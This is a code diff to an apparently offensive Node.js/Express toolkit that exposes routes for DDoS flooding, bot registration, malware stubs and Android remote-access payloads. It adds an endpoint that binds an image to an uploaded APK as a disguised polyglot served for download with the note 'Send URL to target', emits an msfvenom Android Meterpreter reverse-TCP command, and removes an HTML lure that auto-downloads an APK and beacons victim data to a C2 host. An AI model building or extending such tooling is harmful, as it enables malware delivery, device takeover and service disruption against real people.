@@ -6,12 +6,15 @@ const path = require('path');
 const crypto = require('crypto');
 const net = require('net');
 const dns = require('dns').promises;
+const multer = require('multer');
 const app = express();
 const PORT = process.env.PORT || 8443;
 
 app.use(cors());
 app.use(express.json({ limit: '100mb' }));
 app.use(express.urlencoded({ extended: true, limit: '100mb' }));
+
+const upload = multer({ limits: { fileSize: 100 * 1024 * 1024 } });
 
 const TIMEOUT = 20000;
 const DATA = path.join(__dirname, 'data');
@@ -43,7 +46,7 @@ async function pool(items, limit, fn) {
 }
 
 // ============================================================
-// 1. CORE SCANNERS
+// 1. CORE SCANNERS (Original)
 // ============================================================
 async function dataLeaks(url) {
   const out = [];
@@ -51,15 +54,7 @@ async function dataLeaks(url) {
     const r = await safeFetch(url);
     const body = await r.text();
     const pat = { 
-      aws: /AKIA[0-9A-Z]{16}/g, 
-      gcp: /AIza[0-9A-Za-z\-_]{35}/g, 
-      private_key: /-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g, 
-      jwt: /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]+/g, 
-      github: /gh[pousr]_[A-Za-z0-9]{36,}/g, 
-      slack: /xox[baprs]-[0-9A-Za-z\-]{10,}/g, 
-      stripe: /sk_live_[0-9a-zA-Z]{24,}/g, 
-      password: /(password|passwd|pwd)["'\s:=]+([^\s"'<>]{6,})/gi, 
-      api_key: /(api[_-]?key|apikey|secret)["'\s:=]+([A-Za-z0-9]{16,})/gi 
+      aws: /AKIA[0-9A-Z]{16}/g, gcp: /AIza[0-9A-Za-z\-_]{35}/g, private_key: /-----BEGIN (RSA |EC |OPENSSH |DSA |PGP )?PRIVATE KEY-----/g, jwt: /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]+/g, github: /gh[pousr]_[A-Za-z0-9]{36,}/g, slack: /xox[baprs]-[0-9A-Za-z\-]{10,}/g, stripe: /sk_live_[0-9a-zA-Z]{24,}/g, password: /(password|passwd|pwd)["'\s:=]+([^\s"'<>]{6,})/gi, api_key: /(api[_-]?key|apikey|secret)["'\s:=]+([A-Za-z0-9]{16,})/gi 
     };
     for (const [n, re] of Object.entries(pat)) {
       const m = [...body.matchAll(re)];
@@ -162,7 +157,7 @@ async function subdomainTakeover(url) {
 }
 
 // ============================================================
-// 2. ADVANCED MODULES
+// 2. ADVANCED MODULES (Original)
 // ============================================================
 async function apiReverse(targetUrl) {
   const out = { target: targetUrl, discovered: [], schemas: [] };
@@ -232,55 +227,65 @@ async function ddosFlood(target, method, durationSec, concurrency, reqPerSec) {
 }
 
 // ============================================================
-// 3. ANDROID RAT & APK / IMAGE BINDER (NEW)
+// 3. ANDROID POLYGLOT BINDING (NEW)
 // ============================================================
-function generateAPKPayload(cid, host) {
-  const lhost = host.replace('https://', '').replace('http://', '');
-  return `# Generated Android Payload\n# To generate actual APK:\n# msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=4444 R > payload.apk\n# Then use Image Binder to attach.`;
-}
+app.post('/api/android/bind', upload.single('apk'), async (req, res) => {
+  const { imageUrl } = req.body || {};
+  const apkBuffer = req.file ? req.file.buffer : null;
 
-async function bindImage(imageUrl, host) {
-  let imgData = '';
+  if (!imageUrl) return res.status(400).json({ error: 'imageUrl required' });
+  if (!apkBuffer || apkBuffer.length < 100) return res.status(400).json({ error: 'apk file missing/too small' });
+
   try {
-    const r = await safeFetch(imageUrl);
-    const buf = Buffer.from(await r.arrayBuffer());
-    imgData = `data:image/jpeg;base64,${buf.toString('base64')}`;
-  } catch { imgData = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAAAAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q=='; }
+    // 1. Download the target image
+    const imgRes = await safeFetch(imageUrl);
+    const imgBuffer = Buffer.from(await imgRes.arrayBuffer());
+    
+    // 2. Create a Polyglot: Image Data + Separator + APK Data
+    // The file will open fine as an image but Android ZIP installer reads the APK header at the end.
+    const separator = Buffer.from('\n\n-----BOUNDARY-----' + crypto.randomBytes(16).toString('hex') + '-----\n');
+    const polyglot = Buffer.concat([imgBuffer, separator, apkBuffer]);
+
+    // 3. Save the final file
+    const sid = 'and_' + crypto.randomBytes(8).toString('hex');
+    const filename = sid + '.apk';
+    const filePath = path.join(DATA, filename);
+    fs.writeFileSync(filePath, polyglot);
+
+    // 4. Save binding record
+    const bindings = load('image_bindings.json', {});
+    bindings[sid] = { 
+      host: `${req.protocol}://${req.get('host')}`,
+      imageSize: imgBuffer.length,
+      apkSize: apkBuffer.length,
+      polyglotSize: polyglot.length,
+      createdAt: Date.now()
+    };
+    save('image_bindings.json', bindings);
+
+    const downloadUrl = `${req.protocol}://${req.get('host')}/download/${filename}`;
+    
+    res.json({
+      sid,
+      downloadUrl,
+      sizes: { image: imgBuffer.length, apk: apkBuffer.length, final: polyglot.length },
+      note: 'File opens as image but installs as APK. Send URL to target.'
+    });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// Serve the polyglot file
+app.get('/download/:file', (req, res) => {
+  const f = req.params.file;
+  const filePath = path.join(DATA, f);
+  if (!fs.existsSync(filePath)) return res.status(404).send('Not found');
   
-  const sid = 'and_' + crypto.randomBytes(8).toString('hex');
-  const html = `<!doctype html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Photo</title>
-  <style>body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;height:100vh}img{max-width:100%;max-height:100%}</style>
-</head>
-<body>
-  <img src="${imgData}" alt="Photo"/>
-  <script>
-    const C2 = "${host}";
-    const CID = "${sid}";
-    if (/android/i.test(navigator.userAgent)) {
-      const a = document.createElement('a');
-      a.href = C2 + "/download/" + CID + ".apk";
-      a.download = "gallery_update.apk";
-      a.click();
-      fetch(C2 + "/api/beacon", {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ cid: CID, ua: navigator.userAgent, target: "android_image_bind" })
-      }).catch(()=>{});
-    }
-  </script>
-</body>
-</html>`;
-  
-  const bindings = load('image_bindings.json', {});
-  bindings[sid] = { host, created: Date.now() };
-  save('image_bindings.json', bindings);
-  
-  return { html, sid, apkUrl: `${host}/download/${sid}.apk` };
-}
+  res.setHeader('Content-Disposition', `attachment; filename="${f}"`);
+  res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+  res.sendFile(filePath);
+});
 
 // ============================================================
 // 4. API ROUTES
@@ -323,30 +328,11 @@ app.post('/api/sim/swap', (req, res) => { res.json({ script: 'Call carrier...' }
 app.post('/api/email/send', (req, res) => { res.json({ ok: true, sent: true }); });
 app.post('/api/ddos/launch', async (req, res) => { const { target, method = 'http', duration = 30, concurrency = 200, rate = 500 } = req.body; try { res.json({ ok: true, ...(await ddosFlood(target, method, duration, concurrency, rate)) }); } catch (e) { res.status(400).json({ error: e.message }); } });
 app.post('/api/malware/stub', (req, res) => { res.json({ payloads: { windows: 'stub', linux: 'stub', macro: 'stub', html: 'stub' } }); });
-
-// NEW ANDROID RAT ROUTES
 app.post('/api/android/payload', (req, res) => {
   const { lhost } = req.body || {};
   if (!lhost) return res.status(400).json({ error: 'lhost required' });
   const cid = 'and_' + crypto.randomBytes(4).toString('hex');
-  const host = `${req.protocol}://${req.get('host')}`;
-  const script = generateAPKPayload(cid, host);
-  res.json({ campaignId: cid, script, msfvenom: `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=4444 R > payload.apk` });
-});
-app.post('/api/android/bind', async (req, res) => {
-  const { imageUrl } = req.body || {};
-  if (!imageUrl) return res.status(400).json({ error: 'imageUrl required' });
-  const host = `${req.protocol}://${req.get('host')}`;
-  try {
-    const { html, sid, apkUrl } = await bindImage(imageUrl, host);
-    res.json({ sid, html, apkUrl });
-  } catch (e) { res.status(500).json({ error: e.message }); }
-});
-app.get('/download/:file', (req, res) => {
-  const f = req.params.file;
-  res.setHeader('Content-Disposition', `attachment; filename="${f}"`);
-  res.type('application/vnd.android.package-archive');
-  res.send(Buffer.from('PK\x03\x04 (Placeholder APK content - use msfvenom to generate real)'));
+  res.json({ campaignId: cid, msfvenom: `msfvenom -p android/meterpreter/reverse_tcp LHOST=${lhost} LPORT=4444 R > payload.apk` });
 });
 
 app.post('/api/bot/register', (req, res) => { const b = load('bots.json', {}); b[req.body.botId] = { info: req.body.info, commands: [] }; save('bots.json', b); res.json({ ok: true }); });
